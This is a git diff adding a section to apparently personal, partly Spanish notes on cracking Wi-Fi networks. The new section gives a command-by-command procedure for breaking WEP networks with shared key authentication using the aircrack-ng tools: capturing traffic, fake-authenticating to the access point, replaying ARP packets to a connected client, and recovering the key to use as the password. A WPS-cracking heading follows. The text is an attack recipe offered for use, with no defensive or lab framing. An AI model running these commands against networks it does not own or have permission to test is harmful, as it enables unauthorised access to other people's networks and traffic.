@@ -158,6 +158,26 @@ nos volvemos a asociar a la red por si acaso y coremos
 ```
 aircrack-ng (.cap file)
 ```
+## Cracking SKA WEP
+Detect if AUTH is SKA after snifing the network and fakeauth it will show in the terminal 1 on the top in the network spesification 
+```
+airodump-ng mon0
+Terminal 1:
+airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
+Terminal 2:
+aireplay-ng --fakeauth 0 -a (BSSID) -h (Mac del adaptador wifi los primeros 12 caracteres de unspec cambiar las - por :) mon0
+```
+Cracking the SKA network:  
+We need to have a conected client to ckrak it  
+```
+Terminal 1:
+airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
+Terminal 2:
+aireplay-ng --arpreplay -b (BSSID) -h (STATION MAC) mon0
+Terminal 3:
+aircrack-ng (name-01.cap file)
+```
+Use the KEY Found whitout the : as a password
 
 ## WPS Crack
 solo funciona si el ruter no tiene protecion PBC push button autentification
